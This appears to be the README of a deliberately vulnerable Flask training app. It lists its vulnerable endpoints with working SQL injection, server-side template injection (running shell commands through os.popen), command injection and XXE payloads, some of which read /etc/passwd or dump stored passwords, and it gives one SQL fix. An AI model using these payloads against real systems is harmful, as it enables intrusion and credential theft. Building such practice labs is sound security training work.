# eTechAcademy Flask App

## Vulnerabilities

### SQL Injection
Paths: `/login` and `/index`
Methods: `GET, POST`

**Examples:**
- Log into admin account with SQL
```
username: ' OR 1=1--
password: a

OR 

username: admin 
password: ' OR 1=1--
```

- Vulnerable query database on `/index`
```
' OR 1=1--
' UNION SELECT username,password FROM users--
' UNION SELECT username || ':' || password,role FROM users--
```

Resources: [Sqli CheatSheet](https://book.hacktricks.xyz/pentesting-web/sql-injection)

**SQL Fix:**
```
cur.execute("SELECT user_id, role FROM users WHERE username = %s AND password = %s", (username, password))
```

### Server-Side Template Injection
Paths: `/search_course`
Methods: `GET, POST`

**Examples:**
```
{{ 7 * 7 }}
```

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Other resources: [SSTI Cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

### Command Injection
Path: `/admin_dashboard/system_monitor`
Methods: `GET, POST`

**Examples:**
```
whoami
cat /etc/passwd
```

### XML External Entity Injection (XXE)
XXE Injection allows for injection of XML entities to access or manipulate files on application.

Path: `/process_xml`
Methods: `POST`

**Example**
- On `/add_course` XML Section
```
<!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
   <title>Test Title</title>
    <description>Test Description</description>
    <image_path>&xxe;</image_path>
</root>
```

Other resources: [XXE Cheatsheet](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)